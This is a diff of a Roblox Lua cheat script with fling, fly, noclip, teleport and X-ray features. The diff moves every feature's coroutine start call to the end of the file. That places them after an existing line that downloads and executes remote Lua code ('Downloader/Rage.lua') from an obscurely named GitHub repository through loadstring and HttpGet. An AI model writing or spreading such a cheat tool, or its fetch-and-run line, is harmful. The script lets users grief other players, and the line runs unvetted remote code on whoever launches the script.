@@ -1407,7 +1407,6 @@ local function HDKQPCJ_fake_script() -- Fling.LocalScript
 	updatePlayerList("")
 	
 end
-coroutine.wrap(HDKQPCJ_fake_script)()
 local function QCLVMLF_fake_script() -- FLY.ButtonManager 
 	local script = Instance.new('LocalScript', FLY)
 	
@@ -1544,7 +1543,6 @@ local function QCLVMLF_fake_script() -- FLY.ButtonManager
 		end		
 	end)
 end
-coroutine.wrap(QCLVMLF_fake_script)()
 local function TSINDPQ_fake_script() -- NOCLIP.ButtonManager 
 	local script = Instance.new('LocalScript', NOCLIP)
 	
@@ -1643,7 +1641,6 @@ local function TSINDPQ_fake_script() -- NOCLIP.ButtonManager
 		end		
 	end)
 end
-coroutine.wrap(TSINDPQ_fake_script)()
 local function GGVYG_fake_script() -- NOANCHOR.ButtonManager 
 	local script = Instance.new('LocalScript', NOANCHOR)
 	
@@ -1740,7 +1737,6 @@ local function GGVYG_fake_script() -- NOANCHOR.ButtonManager
 	end)
 	
 end
-coroutine.wrap(GGVYG_fake_script)()
 local function LPCCPV_fake_script() -- PROTECTPLATFORM.ButtonManager 
 	local script = Instance.new('LocalScript', PROTECTPLATFORM)
 	
@@ -1847,7 +1843,6 @@ local function LPCCPV_fake_script() -- PROTECTPLATFORM.ButtonManager
 	end)
 	
 end
-coroutine.wrap(LPCCPV_fake_script)()
 local function HRFFAJC_fake_script() -- TELEPORT.ValueManager 
 	local script = Instance.new('LocalScript', TELEPORT)
 	
@@ -1915,7 +1910,6 @@ local function HRFFAJC_fake_script() -- TELEPORT.ValueManager
 	end)
 	
 end
-coroutine.wrap(HRFFAJC_fake_script)()
 local function OQIX_fake_script() -- DORSALTELEPORT.ButtonManager 
 	local script = Instance.new('LocalScript', DORSALTELEPORT)
 	
@@ -2006,7 +2000,6 @@ local function OQIX_fake_script() -- DORSALTELEPORT.ButtonManager
 		end
 	end)
 end
-coroutine.wrap(OQIX_fake_script)()
 local function LBUH_fake_script() -- CLICKTELEPORT.ButtonManager 
 	local script = Instance.new('LocalScript', CLICKTELEPORT)
 	
@@ -2088,7 +2081,6 @@ local function LBUH_fake_script() -- CLICKTELEPORT.ButtonManager
 		end
 	end)
 end
-coroutine.wrap(LBUH_fake_script)()
 local function FDRSMUJ_fake_script() -- FLING.ButtonManager 
 	local script = Instance.new('LocalScript', FLING)
 	
@@ -2204,7 +2196,6 @@ local function FDRSMUJ_fake_script() -- FLING.ButtonManager
 	end)
 	
 end
-coroutine.wrap(FDRSMUJ_fake_script)()
 local function SHXKKP_fake_script() -- XRAY.ButtonManager 
 	local script = Instance.new('LocalScript', XRAY)
 	
@@ -2265,7 +2256,6 @@ local function SHXKKP_fake_script() -- XRAY.ButtonManager
 	end)
 	
 end
-coroutine.wrap(SHXKKP_fake_script)()
 local function MBCIU_fake_script() -- Teleport_2.LocalScript 
 	local script = Instance.new('LocalScript', Teleport_2)
 	
@@ -2339,7 +2329,6 @@ local function MBCIU_fake_script() -- Teleport_2.LocalScript
 	updatePlayerList("")
 	
 end
-coroutine.wrap(MBCIU_fake_script)()
 local function LZFN_fake_script() -- Back.LocalScript 
 	local script = Instance.new('LocalScript', Back)
 	
@@ -2353,7 +2342,6 @@ local function LZFN_fake_script() -- Back.LocalScript
 		script.Parent.Parent.Visible = false
 	end)
 end
-coroutine.wrap(LZFN_fake_script)()
 local function OWOAMKH_fake_script() -- DorsalTeleport.LocalScript 
 	local script = Instance.new('LocalScript', DorsalTeleport)
 	
@@ -2427,5 +2415,17 @@ local function OWOAMKH_fake_script() -- DorsalTeleport.LocalScript
 	updatePlayerList("")
 	
 end
-coroutine.wrap(OWOAMKH_fake_script)()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Downloader/Rage.lua"))()
+coroutine.wrap(HDKQPCJ_fake_script)()
+coroutine.wrap(QCLVMLF_fake_script)()
+coroutine.wrap(TSINDPQ_fake_script)()
+coroutine.wrap(GGVYG_fake_script)()
+coroutine.wrap(LPCCPV_fake_script)()
+coroutine.wrap(HRFFAJC_fake_script)()
+coroutine.wrap(OQIX_fake_script)()
+coroutine.wrap(LBUH_fake_script)()
+coroutine.wrap(FDRSMUJ_fake_script)()
+coroutine.wrap(SHXKKP_fake_script)()
+coroutine.wrap(MBCIU_fake_script)()
+coroutine.wrap(LZFN_fake_script)()
+coroutine.wrap(OWOAMKH_fake_script)()
